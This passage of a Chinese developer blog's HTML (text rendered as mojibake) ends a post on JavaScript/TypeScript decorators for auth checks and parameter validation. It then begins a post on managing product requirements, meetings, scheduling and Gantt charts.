ä¿ç•™åŸæœ‰å‡½æ•°</span></span><br><span class="line">    <span class="keyword">if</span> (!user.isAuth) &#123;</span><br><span class="line">      descriptor.value = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">// æœªç™»å½•å°†è¿”å›æç¤º</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'å½“å‰æœªç™»å½•ï¼Œè¯·ç™»å½•!'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      descriptor.value = <span class="function"><span class="keyword">function</span> (<span class="params">...args</span>) </span>&#123; <span class="comment">// å·²ç™»å½•å°†åŸæœ‰å‡½æ•°</span></span><br><span class="line">        originalMethod.apply(<span class="keyword">this</span>, args);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> descriptor;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@auth</span>(app.user)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleStar</span>(<span class="params"><span class="keyword">new</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">new</span>.like++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>ç±»å‹æ£€æŸ¥</p>
<figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"reflect-metadata"</span>;</span><br><span class="line"><span class="keyword">const</span> stringMetaDataTag = <span class="string">"IsString"</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">IsString</span>(<span class="params">target: <span class="built_in">Object</span>, propertyKey: <span class="built_in">string</span> | symbol, parameterIndex: <span class="built_in">number</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> existingRequiredParameters: <span class="built_in">number</span>[] = Reflect.getOwnMetadata(stringMetaDataTag, target, propertyKey) || [];</span><br><span class="line">  existingRequiredParameters.push(parameterIndex);</span><br><span class="line">  Reflect.defineMetadata( stringMetaDataTag, existingRequiredParameters, target, propertyKey);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params">target: <span class="built_in">any</span>, propertyName: <span class="built_in">string</span>, descriptor: TypedPropertyDescriptor&lt;<span class="built_in">Function</span>&gt;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> method = descriptor.value!;</span><br><span class="line"> </span><br><span class="line">  descriptor.value = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> stringMetaTags: <span class="built_in">number</span>[] = Reflect.getOwnMetadata(stringMetaDataTag, target, propertyName);</span><br><span class="line">    <span class="keyword">if</span> (stringMetaTags) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> parameterIndex of stringMetaTags) &#123;</span><br><span class="line">        <span class="keyword">const</span> value = <span class="built_in">arguments</span>[parameterIndex];</span><br><span class="line">        <span class="keyword">if</span> (!(value <span class="keyword">instanceof</span> <span class="built_in">String</span> || <span class="keyword">typeof</span> value === <span class="string">'string'</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'not string'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> method.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">class</span> A &#123;</span><br><span class="line">    a: <span class="built_in">string</span> = <span class="string">'123'</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@validate</span></span><br><span class="line">    value (<span class="meta">@IsString</span> value: <span class="built_in">string</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(value);</span><br><span class="line">        <span class="keyword">this</span>.a = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="å†™åœ¨æœ€å"><a href="#å†™åœ¨æœ€å" class="headerlink" title="å†™åœ¨æœ€å"></a>å†™åœ¨æœ€å</h2><p>ç¬”è€…åœ¨ åå°æ¥å£ã€Js Bridgeã€React é¡¹ç›®ä¸Šéƒ½æœ‰å®è·µè¿‡ã€‚ä¸å¾—ä¸è¯´ï¼Œè£…é¥°å™¨æ¨¡å¼åœ¨é¢å‘åˆ‡é¢ç¼–ç¨‹(AOP)å‡ ä¹æ˜¯ â€œæœ€ä½³å®è·µâ€ï¼Œæå¤§çš„æå‡äº†ç¼–ç¨‹æ•ˆç‡ã€‚ä¹Ÿå¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®åŠ©åˆ°ä½ ğŸ˜Š</p>
<h3 id="npm-åŒ…"><a href="#npm-åŒ…" class="headerlink" title="npm åŒ…"></a>npm åŒ…</h3><p><a href="https://github.com/typestack/class-validator" target="_blank" rel="noopener">class-validator</a><br><a href="https://github.com/jayphelps/core-decorators" target="_blank" rel="noopener">core-decorators</a><br><a href="https://github.com/nestjs/nest" target="_blank" rel="noopener">Nest åå°æ¡†æ¶</a></p>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><p><a href="https://github.com/tc39/proposal-decorators" target="_blank" rel="noopener">tc39-proposal</a><br><a href="https://www.typescriptlang.org/docs/handbook/decorators.html" target="_blank" rel="noopener">typescript</a><br><a href="https://saul-mirone.github.io/a-complete-guide-to-typescript-decorator/" target="_blank" rel="noopener">a-complete-guide-to-typescript-decorator</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/éœ€æ±‚å¼€å‘/the-skills-of-develop/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="gdccwxx">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="gdccwxx">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/éœ€æ±‚å¼€å‘/the-skills-of-develop/" itemprop="url">åšéœ€æ±‚ææ˜ç™½è¿™å‡ ç‚¹ï¼Œå’ŒåŠ ç­è¯´å†è§</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2021-08-23T13:39:15+08:00">
                2021-08-23
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><img src="/éœ€æ±‚å¼€å‘/the-skills-of-develop/xmind.png" alt="xmind"></p>
<h2 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h2><p>ä½ æ˜¯ä¸æ˜¯æ¥éœ€æ±‚åæ‰‹è¶³æ— æªï¼Ÿæ˜¯ä¸æ˜¯å¤©å¤©å¿™ç¢Œï¼Œä½†åˆæ•ˆç‡ä¸é«˜ï¼Ÿæ˜¯ä¸æ˜¯éœ€æ±‚æ²Ÿé€šå‰åä¸ä¸€è‡´ï¼Œå¯¼è‡´é‡å¤ä¿®æ”¹ï¼Ÿå‡ å¹´å‰åˆšè¸å…¥èŒåœºç”Ÿæ´»çš„æˆ‘ï¼Œå¯¹æ­¤æ·±æœ‰ä½“ä¼šã€‚ç»è¿‡æ²‰æ·€ï¼Œç»ˆäºææ˜ç™½æ€ä¹ˆé«˜æ•ˆå¼€å‘ï¼Œé«˜æ•ˆä¼šè®®ï¼Œæ€»ç»“è¿™å‡ ç‚¹ç»éªŒï¼šå’Œäº§å“åšæœ‹å‹ã€éœ€æ±‚å¯¹é½å’Œæ’æœŸã€éœ€æ±‚æ–¹æ¡ˆè®¾è®¡ä¸å‘å¸ƒä¸Šçº¿ã€äº‹æ•…ä¸å¤ç›˜ã€‚ä»æ­¤é«˜æ•ˆå·¥ä½œï¼Œæ—©æ—©ä¸‹ç­ã€‚</p>
<h2 id="æ ‘ç«‹æ­£ç¡®çš„è§‚ç‚¹"><a href="#æ ‘ç«‹æ­£ç¡®çš„è§‚ç‚¹" class="headerlink" title="æ ‘ç«‹æ­£ç¡®çš„è§‚ç‚¹"></a>æ ‘ç«‹æ­£ç¡®çš„è§‚ç‚¹</h2><p>é˜…è¯»ä¹‹å‰ï¼Œä¸å¦¨é—®é—®è‡ªå·±ï¼Œå·¥ä½œçš„ç›®çš„æ˜¯å•¥ï¼Ÿ<br>ä¹Ÿè®¸æ¯ä¸ªäººæœ‰ä¸åŒçš„è§‚ç‚¹ã€‚æœ‰äººè§‰å¾—äº‹æƒ…æ°¸è¿œéƒ½å¹²ä¸å®Œï¼Œä¸å¦‚æ…¢æ…¢åšï¼Œè‡ªå·±ä¹Ÿæ›´è½»æ¾ã€‚ä½†æœ‰ç§é«˜çº§çš„æ€ç»´æ–¹å¼æ˜¯ï¼šå°½è‡ªå·±åŠªåŠ›åšå¥½æ¯ä»¶äº‹æƒ…ã€‚å› ä¸ºåªæœ‰å¥½å¥½å¯¹å·¥ä½œï¼Œå‡èŒåŠ è–ªæ‰ä¼šå¥½å¥½å¯¹ä½ ï¼›åªæœ‰å¯¹å·¥ä½œè¡¨ç°å‡ºçƒ­æƒ…ï¼Œè€æ¿æ‰ä¼šå¯¹ä½ æœ‰ä¿¡å¿ƒï¼Œæ‰æ›´å¯èƒ½åœ¨èŒåœºæ¿€çƒˆçš„ç«äº‰ä¸­è„±é¢–è€Œå‡ºã€‚</p>
<h2 id="å’Œäº§å“åšæœ‹å‹"><a href="#å’Œäº§å“åšæœ‹å‹" class="headerlink" title="å’Œäº§å“åšæœ‹å‹"></a>å’Œäº§å“åšæœ‹å‹</h2><p>äº§å“æ˜¯ä¸€ç¾¤æœ‰æƒ³è±¡åŠ›ï¼Œèƒ½æŠŠæŠ½è±¡çš„äº‹æƒ…å…·ä½“åŒ–çš„äººã€‚ä»–ä»¬ä¸ä»…æœ‰è®¸å¤šæ–°é¢–çš„ç‚¹å­ï¼Œè¿˜èƒ½è¿…é€Ÿçš„ get åˆ°ä½ è¯´çš„æƒ³æ³•ã€‚å’Œäº§å“åŒå­¦åšæœ‹å‹ä¸ä»…èƒ½æ›´åŠ é¡ºåˆ©çš„åˆä½œï¼Œè¿˜èƒ½å¼€æ‹“è§†é‡ï¼Œå¢é•¿è§è¯†ã€‚æ¯”å¦‚å’Œäº§å“ä¸€èµ·åç”µæ¢¯ï¼Œä»–ä»¬å¯èƒ½ä¼šæƒ³ä¸ºä»€ä¹ˆè¦è£…é•œå­ï¼Œè€Œä½ ä¼šæƒ³ç”µæ¢¯ç³»ç»Ÿæ˜¯æ€ä¹ˆå®ç°çš„ã€‚åœ¨ä¸åŒè§’åº¦çœ‹åŒä¸€ä»¶äº‹æƒ…ä¸ä»…ååˆ†æœ‰è¶£ï¼Œè¿˜èƒ½æ‰©å±•æ›´å¤šå¯èƒ½ï¼Œä¸å¦¨è¯•è¯•çœ‹ã€‚</p>
<h3 id="ç¬¬ä¸€æ‰‹éœ€æ±‚"><a href="#ç¬¬ä¸€æ‰‹éœ€æ±‚" class="headerlink" title="ç¬¬ä¸€æ‰‹éœ€æ±‚"></a>ç¬¬ä¸€æ‰‹éœ€æ±‚</h3><p>å’Œäº§å“åšæœ‹å‹ï¼Œèƒ½æ¯”åˆ«äººæ›´å¿«çš„æ‹¿åˆ°ç¬¬ä¸€æ‰‹éœ€æ±‚ã€‚<br>äº§å“çš„éœ€æ±‚å¹¶ä¸æ˜¯å‡­ç©ºè€Œæ¥ï¼Œå®ƒå¯èƒ½æ˜¯ä»ç«å“ã€å®¢æˆ·éœ€æˆ–è€æ¿æå‡ºçš„ï¼Œäº§å“å¾€å¾€æ˜¯æŠŠéœ€æ±‚å…·ä½“åŒ–çš„äººã€‚ä»–ä»¬æ›´å¤šçš„å…³æ³¨æ˜¯éœ€æ±‚æ˜¯æ€ä¹ˆå®ç°çš„ã€‚ä»¥åŠè”åŠ¨çš„åŠŸèƒ½å’Œå¼‚å¸¸åœºæ™¯ã€‚è€Œå¼€å‘åˆ™ä¼šæŠŠå…·ä½“çš„éœ€æ±‚é€šè¿‡ç¼–ç å®ç°ã€‚<br>å½“ç„¶ï¼Œæ­£å› ä¸ºäº§å“çš„è§’åº¦æ›´å¤šçš„æ˜¯æ€ä¹ˆå®ç°éœ€æ±‚ï¼Œä¹Ÿæ›´å®¹æ˜“è¿‡äºå…³æ³¨éœ€æ±‚å®ç°ï¼Œè€ŒæŠŠåŸæœ¬ç”¨æˆ·è¯‰æ±‚æ— é™æ”¾å¤§ï¼Œå¿½ç•¥äº†éœ€æ±‚æœ¬èº«ã€‚<br>å¼€å‘æ‹¿åˆ°ç¬¬ä¸€æ‰‹éœ€æ±‚æœ€å¥½çš„æ–¹å¼æ˜¯å¦‚ä½•å®ç°éœ€æ±‚å‡ºå‘ï¼Œå¯ä»¥é€šè¿‡å“ªäº›æ–¹å¼æ¥è§£å†³ã€‚ä¹Ÿè®¸éœ€æ±‚å¯ä»¥ä¸ç”¨å¼€å‘ï¼Œåªéœ€æ¢ä¸ªè§’åº¦çœ‹é—®é¢˜å°±èƒ½è½»æ¾è§£å†³ã€‚</p>
<p>æ ¸å¿ƒæ€æƒ³:  why</p>
<h2 id="éœ€æ±‚å¯¹é½å’Œæ’æœŸ"><a href="#éœ€æ±‚å¯¹é½å’Œæ’æœŸ" class="headerlink" title="éœ€æ±‚å¯¹é½å’Œæ’æœŸ"></a>éœ€æ±‚å¯¹é½å’Œæ’æœŸ</h2><h3 id="éœ€æ±‚å®£è®²"><a href="#éœ€æ±‚å®£è®²" class="headerlink" title="éœ€æ±‚å®£è®²"></a>éœ€æ±‚å®£è®²</h3><p><img src="/éœ€æ±‚å¼€å‘/the-skills-of-develop/discuss.png" alt="discuss"><br>éœ€æ±‚å®£è®²æ˜¯äº§å“ä¸å¼€å‘ã€æµ‹è¯•æŠŠæ–¹æ¡ˆå†…å®¹è¾“å‡ºçš„ä¸»è¦é€”å¾„ã€‚ä¸€ä»½éœ€æ±‚çš„å®£è®²è¿‡ç¨‹ï¼Œå¤§è‡´å¯åˆ†ä¸ºéœ€æ±‚å®£è®²å‰ã€éœ€æ±‚å®£è®²ä¸­ã€éœ€æ±‚å®£è®²åã€‚éµå¾ªä¸€å¥—æµç¨‹èƒ½æœ‰æ•ˆé¿å…è¸©å‘å’Œé«˜æ•ˆç‡ä¼šè®®ã€‚</p>
<h4 id="éœ€æ±‚å®£è®²å‰ï¼š"><a href="#éœ€æ±‚å®£è®²å‰ï¼š" class="headerlink" title="éœ€æ±‚å®£è®²å‰ï¼š"></a>éœ€æ±‚å®£è®²å‰ï¼š</h4><p>äºšé©¬é€Šçš„é«˜ç®¡ä¼šè®®ï¼Œä¼šåœ¨å¼€ä¼šå‰åŠå°æ—¶é˜…è¯»ä¼šè®®å†…å®¹ï¼Œå†æ ¹æ®æ¢³ç†çš„ç–‘é—®è¿›è¡Œè®¨è®ºã€‚<br>é˜…è¯»éœ€æ±‚æ–‡æ¡£æ˜¯å¿…ä¸å¯å°‘çš„è¿‡ç¨‹ã€‚æœ‰æ•ˆçš„é˜…è¯»æ–‡æ¡£ï¼Œèƒ½åœ¨éœ€æ±‚å®£è®²æ—¶æ›´èƒ½æå‡ºè‡ªå·±çš„ç–‘é—®ä¸è§‚ç‚¹ï¼Œèƒ½é¿å…å‰æœŸå› ä¸ºå‡†å¤‡ä¸è¶³ï¼Œå¯¼è‡´çš„ä¼šè®®æ•ˆç‡ä½ä¸‹ã€‚è¿™æ ·çš„é«˜æ•ˆå·¥ä½œæ–¹å¼æ›´å€¼å¾—ä½œä¸ºæ‰“å·¥äººçš„æˆ‘ä»¬å€Ÿé‰´ã€‚éœ€æ±‚å®£è®²å‰å¯ä»¥ä»ï¼š</p>
<ul>
<li>çœ‹éœ€æ±‚ï¼šäº†è§£éœ€æ±‚çš„èƒŒæ™¯ï¼Œå’Œç±»ä¼¼åœºæ™¯å…¶ä»–äº§å“æ€ä¹ˆå®ç°çš„</li>
<li>æç–‘é—®ï¼šèåˆ Whyã€Howã€What å»æ€è€ƒ</li>
<li>ç»™æ–¹æ¡ˆï¼šå¯¹ç°æœ‰çš„æŠ€æœ¯ç»™éœ€æ±‚çš„æ–¹æ¡ˆ</li>
<li>ç»™æ’æœŸï¼šç»™å‡ºå¤§æ¦‚çš„æ’æœŸï¼Œä»¥ äºº/å¤© ä¸ºå•ä½è¿›è¡Œä¼°ç®—</li>
</ul>
<h4 id="éœ€æ±‚å®£è®²ä¸­ï¼š"><a href="#éœ€æ±‚å®£è®²ä¸­ï¼š" class="headerlink" title="éœ€æ±‚å®£è®²ä¸­ï¼š"></a>éœ€æ±‚å®£è®²ä¸­ï¼š</h4><p>éœ€æ±‚å®£è®²ä¸­ä¸»è¦æ˜¯å¯¹é½æ–¹æ¡ˆï¼Œè§£å†³ç–‘æƒ‘ã€‚ä½œä¸ºå¼€å‘è€…æœŸæœ›çš„æ˜¯å¯¹æ‰€æœ‰å¼‚å¸¸åœºæ™¯ä¸æ–¹æ¡ˆæœ‰å¤§æ¦‚çš„äº†è§£ï¼Œä¸”é«˜æ•ˆä¼šè®®ï¼Œä¸€æ¬¡é€šè¿‡ã€‚éœ€æ±‚å®£è®²ä¸­å›´ç»•ï¼š</p>
<ul>
<li>æå‡ºç–‘é—®ï¼šæå‡ºä¼šå‰å‡†å¤‡çš„ç–‘é—®ï¼Œå¹¶å‘æ•£å‡ºæ–°çš„ç–‘é—®</li>
<li>ç¡®è®¤éœ€æ±‚ï¼šå’Œäº§å“ã€æµ‹è¯•æ–¹æ²Ÿé€šå¯¹é½è¡¨ç°å’Œå¼‚å¸¸åœºæ™¯ï¼Œæœ€å¥½æœ‰å½•å±ä½œä¸ºè¯æ®</li>
<li>ä¸€æ¬¡é€šè¿‡ï¼šæœ‰ä¸ç¡®å®šçš„ç‚¹ä¼šä¸­ç«‹é©¬æ‹‰ä¸Šç›¸å…³åŒå­¦å¯¹é½ï¼Œäº‰å–ä¸€æ¬¡æ€§é€šè¿‡ä¼šè®®ï¼Œä¸å¼€ç¬¬äºŒæ¬¡</li>
<li>ç¡®è®¤ deadline: ä¸ä¼°ç®—çš„ äºº/å¤© è¿›è¡ŒåŒ¹é…ï¼Œæœ‰ç–‘é—®å¯å‘è´Ÿè´£äººæå‡º</li>
</ul>
<h4 id="éœ€æ±‚å®£è®²åï¼š"><a href="#éœ€æ±‚å®£è®²åï¼š" class="headerlink" title="éœ€æ±‚å®£è®²åï¼š"></a>éœ€æ±‚å®£è®²åï¼š</h4><p>ä¼šè®®åé€šå¸¸éœ€è¦ç»“è®ºçš„æ²‰æ·€ã€‚è¿™æ ·çš„å¥½å¤„æ˜¯åœ¨ä¸è®°å¾—éœ€æ±‚ç»†èŠ‚æ—¶å¯ä»¥ç¿»çœ‹å­˜æ¡£æ¥ç¡®è®¤ç»†èŠ‚ã€é˜²æ­¢äº§å“ç”©é”…ç­‰ã€‚å®£è®²å†…å®¹æ²‰æ·€çš„æ–¹å¼ï¼š</p>
<ul>
<li>å½•åƒå›æ”¾ï¼šæœ‰é—®é¢˜å¯å°†å½•åƒå›æ”¾ï¼Œæ‰¾åˆ°è®¨è®ºçš„åœ°æ–¹</li>
<li>ä¼šè®®çºªè¦ï¼šå°†æœ¬æ¬¡çš„ç»“è®ºã€éœ€è¦è·Ÿè¿›çš„ç‚¹å†™ä¸‹æ¥ï¼Œå‘ç¾¤é‡Œï¼Œå¹¶è‰¾ç‰¹ç›¸å…³åŒå­¦</li>
</ul>
<p>ä¼šè®®çºªè¦å¸¸ç”¨æ¨¡ç‰ˆï¼š<br>ç»è¿‡ä¸äº§å“æ–¹ã€xxæ–¹çš„æ²Ÿé€šï¼Œæœ‰ä»¥ä¸‹ç»“è®ºä¸è·Ÿè¿›äº‹é¡¹ï¼š<br>ç»“è®ºï¼š<br>1ã€xxx<br>è·Ÿè¿›äº‹é¡¹ï¼š<br>1ã€ xxxx @xxxx åŒå­¦<br>è¾›è‹¦ @xxxx å…³æ³¨å¹¶ç¡®è®¤</p>
<p>æ ¸å¿ƒæ€æƒ³: How</p>
<h3 id="ç›®æ ‡æ‹†è§£ä¸ç”˜ç‰¹å›¾"><a href="#ç›®æ ‡æ‹†è§£ä¸ç”˜ç‰¹å›¾" class="headerlink" title="ç›®æ ‡æ‹†è§£ä¸ç”˜ç‰¹å›¾"></a>ç›®æ ‡æ‹†è§£ä¸ç”˜ç‰¹å›¾</h3><p>æœ‰äº†å…·ä½“çš„éœ€æ±‚åï¼Œå°±æ¥åˆ°äº†æ’æœŸç¼“è§£ã€‚äº§å“åŒå­¦å¸Œæœ›è¶Šå¿«è¶Šå¥½ï¼Œè€Œ PMï¼ˆProject Managerï¼‰ ä¼šæ ¹æ®ç‰ˆæœ¬çš„æ—¶é—´ç‚¹æ’æœŸã€‚ä¹Ÿæ­£å› ä¸ºäºŒè€…çš„ç›®æ ‡ä¸åŒï¼Œä¼šå­˜åœ¨ PM çš„æ’æœŸä¸äº§å“æœŸæœ›æ—¶é—´å¹¶ä¸æ˜¯ç›¸åŒæ—¶é—´ç‚¹ã€‚ä¸ºäº†ä¿è¯éœ€æ±‚ä¸å› ä¸ºè‡ªå·± delayï¼Œåˆç†çš„äººåŠ›ä¼°ç®—å’Œç›®æ ‡æ‹†è§£å˜å¾—å¿…ä¸å¯å°‘ã€‚</p>
<h4 id="ç›®æ ‡æ‹†è§£"><a href="#ç›®æ ‡æ‹†è§£" class="headerlink" title="ç›®æ ‡æ‹†è§£"></a>ç›®æ ‡æ‹†è§£</h4><p>å¥½çš„ç›®æ ‡æ‹†è§£é€šå¸¸ä¼šä»¥å¤§ç›®æ ‡å’Œå°ç›®æ ‡æ¥è¿›è¡Œæ‹†åˆ†ã€‚å¤§ç›®æ ‡åŒ…æ‹¬éœ€æ±‚è¯„å®¡æ—¶é—´ã€å¼€å‘æ—¶é—´ã€è”è°ƒæ—¶é—´ã€æµ‹è¯•æ—¶é—´ã€code review æ—¶é—´ã€å‘å¸ƒæ—¶é—´ï¼Œä»¥æ—¶é—´èŠ‚ç‚¹ä¸ºé¢—ç²’ï¼›å°ç›®æ ‡åŒ…æ‹¬å¼€å‘è¿›åº¦ã€è”è°ƒè¿›åº¦ï¼Œä»¥æ¯å¤©çš„äº‹ä»¶ä¸ºé¢—ç²’ã€‚<br>è¯„ä¼°åšä¸å®Œéœ€æ±‚è¯¥æ€ä¹ˆåŠï¼Ÿ</p>
<ul>
<li>éœ€æ±‚ä¸Šï¼šè¿­ä»£å¤„ç†ï¼Œåˆ†æˆæœ¬æœŸå¿…ä¿ã€æœ¬æœŸå†²åˆºã€æœ¬æœŸä¸åšçš„å‡ ç§ç±»å‹</li>
<li>äººåŠ›ä¸Šï¼šè¯„ä¼°åŠ äººèƒ½å¦è§£å†³</li>
<li>æ—¶é—´ä¸Šï¼šdeadline delay è¿˜æ˜¯éœ€æ±‚ delay</li>
</ul>
<h4 id="éœ€æ±‚æ‹†åˆ†çš„å°-tips"><a href="#éœ€æ±‚æ‹†åˆ†çš„å°-tips" class="headerlink" title="éœ€æ±‚æ‹†åˆ†çš„å° tips"></a>éœ€æ±‚æ‹†åˆ†çš„å° tips</h4><p>å°†å¼€å‘ã€è”è°ƒäº‹ä»¶æ‹†è§£ï¼Œç»†åˆ†åˆ°æ¯å‘¨ã€æ¯å¤©çš„å·¥ä½œã€‚è®©æ¯å¤©çš„è¿›åº¦å¯æ§ï¼ŒæŒ‰æ—¶å®Œæˆå·¥ä½œï¼ŒæŒ‰æ—¶å›å®¶ã€‚å‡ºç°è¿›åº¦ä¸å¯æ§åˆ™å‘¨æœ«é€‚å½“è°ƒæ•´ä¸‹ã€‚<br>å¯¹ç›®æ ‡æ‹†è§£åˆ°å…·ä½“å†…å®¹ï¼š</p>
<ul>
<li>éœ€æ±‚ deadline å€’æ¨å‡ºéœ€æ±‚å¼€å‘å®Œæˆã€ææµ‹ã€å‘å¸ƒæ—¶é—´ç‚¹</li>
<li>æ ¹æ®æ—¶é—´ç‚¹å®šå…·ä½“å¼€å‘å†…å®¹ï¼Œæ¯å‘¨ç›®æ ‡ã€æ¯æ—¥ç›®æ ‡</li>
</ul>
<p>å°ç›®æ ‡æ‹†è§£åï¼Œç”˜ç‰¹å›¾å°±æ›´èƒ½æ˜¾ç¤ºå·¥ä½œå†…å®¹å’Œè¿›åº¦äº†ã€‚</p>
<h3 id="ç”˜ç‰¹å›¾"><a href="#ç”˜ç‰¹å›¾" class="headerlink" title="ç”˜ç‰¹å›¾"></a>ç”˜ç‰¹å›¾</h3><p><img src="/éœ€æ±‚å¼€å‘/the-skills-of-develop/gantt-chart.png" alt="gantt-chart"></p>
<p>ç”˜ç‰¹å›¾èƒ½æ¸…æ™°çš„çŸ¥é“å·¥ä½œè¿›åº¦ã€‚ä¸ªäººä½¿ç”¨ç”˜ç‰¹å›¾èƒ½æ¸…æ™°çš„å®šå¥½æ¯å¤©çš„ç›®æ ‡ï¼Œé«˜æ•ˆå·¥ä½œï¼›å¤šäººåˆä½œä½¿ç”¨ç”˜ç‰¹å›¾èƒ½åˆ’åˆ†æ¯ä¸ªäººçš„å·¥ä½œå†…å®¹ä»¥åŠè¿›åº¦åŒæ­¥ã€‚<br>ä½¿ç”¨ç”˜ç‰¹å›¾çš„å¥½å¤„å¾ˆå¤šï¼Œå®ƒä¸ä»…èƒ½ç›´è§‚ã€å®šé‡çš„çœ‹åˆ°è¿›åº¦ï¼Œè¿˜èƒ½çŸ¥é“é¢„æœŸç›®æ ‡å’Œå®é™…äº§å‡ºçš„å·®å€¼ï¼Œèƒ½æœ‰æ•ˆçŸ¥é“è¿›åº¦å¿«ã€æ…¢çš„åŸå› ã€‚æ›´é‡è¦çš„æ˜¯æœ‰æ²‰æ·€ï¼Œæœ‰åˆ©äºéœ€æ±‚å®Œæˆåçš„å›é¡¾ï¼ŒåŠæ—¶å‡ å¹´åçœ‹åˆ°è‡ªå·±ç”»çš„ç”˜ç‰¹å›¾ï¼Œä¹Ÿèƒ½å¾ˆå¿«çš„å›å¿†èµ·å½“æ—¶åšéœ€æ±‚çš„é—®é¢˜ä¸å›°éš¾ï¼Œå……å½“éœ€æ±‚å¿«ç…§çš„ä½œç”¨ã€‚</p>
<p>æ ¸å¿ƒæ€æƒ³: When</p>
<h2 id="ä»æ–¹æ¡ˆè®¾è®¡åˆ°å‘å¸ƒä¸Šçº¿"><a href="#ä»æ–¹æ¡ˆè®¾è®¡åˆ°å‘å¸ƒä¸Šçº¿" class="headerlink" title="ä»æ–¹æ¡ˆè®¾è®¡åˆ°å‘å¸ƒä¸Šçº¿"></a>ä»æ–¹æ¡ˆè®¾è®¡åˆ°å‘å¸ƒä¸Šçº¿</h2><p>ä»æ–¹æ¡ˆè®¾è®¡åˆ°å‘å¸ƒä¸Šçº¿ï¼ŒåŸºæœ¬å±äºå¼€å‘å’Œæµ‹è¯•çš„å·¥ä½œã€‚æ–¹æ¡ˆè®¾è®¡èƒ½å…·ä½“é‡åŒ–éœ€æ±‚æ–¹æ¡ˆï¼Œä¹Ÿèƒ½æœ‰æ•ˆä¿è¯å¼€å‘è¿›åº¦ï¼Œè¿™ä¸€ç¯èŠ‚å¿…ä¸å¯å°‘ã€‚å¼€å‘å’Œæµ‹è¯•çš„æœ‰æ•ˆæ²Ÿé€šä¹Ÿèƒ½å¸®åŠ©å¼€å‘æ‰¾åˆ°ä»£ç æ¼æ´ï¼Œé¿å…å‘å¸ƒä¸Šçº¿åå¸¦æ¥çš„äº‹æ•…ï¼Œè¿™äº›ç¯èŠ‚ååˆ†é‡è¦ã€‚</p>
